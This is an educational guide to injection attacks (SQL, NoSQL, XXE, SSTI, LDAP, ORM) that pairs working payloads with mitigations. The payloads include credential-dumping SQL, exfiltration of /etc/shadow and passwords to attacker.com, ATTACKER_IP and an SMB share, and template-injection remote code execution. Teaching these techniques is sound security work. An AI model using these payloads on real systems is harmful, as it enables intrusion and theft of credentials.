# Injection Attacks – A Practical Guide


## Table of Contents

1. [SQL Injection](#sql-injection)  
    
2. [NoSQL Injection](#nosql-injection)  
    
3. [XML External Entity (XXE) Injection](#xml-external-entity-xxe-injection)  
    
4. [SSTI (Server-side Template Injection)](#ssti-server-side-template-injection) 
    
5. [LDAP Injection](#ldap-injection)  
    
6. [Object-Relational Mapper (ORM) Injection](#object-relational-mapper-orm-injection)   


---
Injection flaws arise when user‑supplied data is concatenated into an interpreter context (SQL, XPath, LDAP, shell, template engine …) without sufficient validation. Exploitation typically lets an attacker:

- Read or alter sensitive data;
    
- Execute arbitrary commands on the underlying host;
    
- Pivot deeper into the internal network.

Although input validation, parameterised interfaces, and least‑privilege design solve the problem in principle, misconfigurations and legacy code keep injection firmly in the OWASP Top 10.
## 1  SQL Injection

SQL injection (SQLi) arises when untrusted data are concatenated into a database query so that part of the input is interpreted as SQL. When successful, an attacker can read or alter data well beyond their intended privilege.

### 1.1  In‑band SQLi

In‑band attacks return the stolen data through the same HTTP response.

```sql
-- Determine the number of columns
1' ORDER BY 3 -- -
-- UNION to test data extraction
1' UNION SELECT NULL,@@version,NULL -- -
```

**Typical workflow**

1. **Fingerprint** the DBMS:  
    `UNION SELECT NULL,@@version,NULL`
    
2. **List the current database**:  
    `UNION SELECT NULL,DATABASE(),NULL`
    
3. **Enumerate tables**:  
    `UNION SELECT NULL, GROUP_CONCAT(table_name), NULL FROM information_schema.tables WHERE table_schema = DATABASE()`
    
4. **Dump data**:  
    `UNION SELECT NULL, GROUP_CONCAT(username,0x3a,password SEPARATOR 0x3c62723e), NULL FROM staff_users`
    

> _Note: Always match the number and data‑types of the original query’s columns._

### 1.2  Blind SQLi

When the response does not include error messages or data, inference techniques are required.

- **Boolean‑based**
    
    ```sql
    ' OR 1=1 -- -
    ' AND (SELECT SUBSTR(DATABASE(),1,1)='s') -- -
    ```
    
- **Time‑based**
    
    ```sql
    ' AND IF(ASCII(SUBSTR(USER(),1,1))>100,SLEEP(5),0) -- -
    ```
    

### 1.3  Second‑order SQLi

Malicious input is stored by the application and executed later, often in a privileged context.

```sql
12345'; UPDATE books SET title='Hacked' WHERE id=1; --
```

The update fires only when the row is subsequently processed by vulnerable code.

### 1.4  Filter Evasion

|Scenario|Technique|Example|
|---|---|---|
|Keyword filtering|Mixed case / inline comment|`SE/*foo*/LECT`|
|Quotes blocked|Numeric or hex literals|`OR 0x31=0x31`|
|Spaces blocked|Encoded or comment whitespace|`UNION/**/SELECT/**/1`|
|Operators blocked|Logical equivalents|`OR 1 /*foo*/=/*bar*/ 1`|
|Full keywords blocked|CHAR/CONCAT encoding|`UNION SELECT CHAR(117,115,101,114)`|

### 1.5  Out‑of‑band SQLi

When neither in‑band nor time‑based techniques work, leverage a second channel (DNS, HTTP, SMB) that the database can reach.

_MySQL example (DNS)_

```sql
SELECT LOAD_FILE(CONCAT('\\',(SELECT password FROM users WHERE id=1),'.attacker.com\\a'));
```

_MSSQL example (SMB share)_

```sql
EXEC xp_cmdshell 'bcp "SELECT name FROM master..syslogins"
      queryout "\\\\10.10.58.187\\logs\\out.txt" -c -T';
```

### 1.6  Useful SQLi Tools

- **sqlmap** – automated detection and exploitation
    
- **BBQSQL** – blind SQLi framework
    
- **SQLNinja** – MSSQL‑specific exploitation
    
- **JSQL Injection** – GUI multi‑DBMS injector
    

### 1.7  Defensive Checklist

1. _Prepared statements / stored procedures_
    
2. Strict server‑side input validation (allow‑list)
    
3. Least‑privilege database accounts
    
4. Positive security model in the WAF
    
5. Regular dependency patching and code review
    

---

## 2  NoSQL Injection

### MongoDB examples

_Operator injection_

```http
POST /login
user[$ne]=admin&pass[$ne]=anything
```

_Regex bypass_

```http
user=pedro&pass[$regex]=.*&remember=on
```

Mitigations are the same in spirit: parameterise queries, validate datatypes, and never pass raw JSON from users into the database driver.

---

## 3  XXE (XML External Entity) Injection

XXE exploits insecure XML parsers that resolve external entities.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

### Out‑of‑band XXE

`sample.dtd`

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/shadow">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://ATTACKER_IP/?%file;'>">
%all;
```

Payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://ATTACKER_IP/sample.dtd">
<data>&send;</data>
```

#### Mitigation (language snippets)

_Java_

```java
DocumentBuilderFactory f = DocumentBuilderFactory.newInstance();
f.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
f.setExpandEntityReferences(false);
```

_.NET_

```csharp
var settings = new XmlReaderSettings
{
    DtdProcessing = DtdProcessing.Prohibit,
    XmlResolver   = null
};
```

Use `defusedxml` in Python and disable external entities in PHP (`libxml_disable_entity_loader()`).

---

## 4  Server‑Side Template Injection (SSTI)

Identify the engine by sending a maths test:

|Engine|Probe|Expected|
|---|---|---|
|Jinja2|`{{7*7}}`|`49`|
|Twig|`{{7*'7'}}`|`49` or error|
|Pug|`#{7*7}`|`49`|

### Jinja2 RCE

```jinja2
{{''.__class__.mro()[1].__subclasses__()[157]
    .__init__.__globals__['__builtins__']['__import__']('os')
    .popen('id').read()}}
```

### Pug / Jade RCE

```pug
#{process.mainModule.require('child_process')
   .execSync('id')}
```

### Mitigation

- Enable the engine’s **sandbox** (e.g. `jinja2.sandbox.SandboxedEnvironment`)
    
- Escape or strip user input before rendering (`{{ variable | e }}` in Jinja2)
    
- Disable dangerous tags such as `{php}` in Smarty
    
- Use Content Security Policy where applicable
    

---

## 5  LDAP Injection

LDAP filters are vulnerable when user input is not escaped:

```ldap
(&(uid={userInput})(userPassword={passInput}))
```

**Attack**

```
userInput = *)(uid=*
passInput = anything)
```

Final filter:

```ldap
(&(uid=*)(uid=*)(userPassword=anything))
```

Mitigation: escape metacharacters (`* ( ) \ NUL`) and prefer parameterised LDAP APIs.

---

## 6  ORM Injection

If an application escapes SQL but still builds dynamic clauses, it may be exploitable at the ORM layer.

**Laravel – Eloquent**

```php
// Unsafe
User::whereRaw("name = '$input'")->get();
```

**Payload**

```
name->"%27)) LIMIT 10 #
```

Generates:

```sql
SELECT * FROM users
ORDER BY json_unquote(json_extract(name,'$."')) LIMIT 10 #')) ASC
```

### Protecting against ORM injection

- Always use parameterised methods (`where('name', $input)`)
    
- Disable raw queries or wrap them with allow‑listed fields
    
- Employ consistent input validation / sanitisation
    

---

## Further Reading

- **OWASP Testing Guide** v5 – Injection chapter
    
- **OWASP Cheat Sheet Series** – SQLi, XXE, SSTI, LDAP Injection
    
- **PortSwigger Web Security Academy** – interactive labs for each technique
    

---

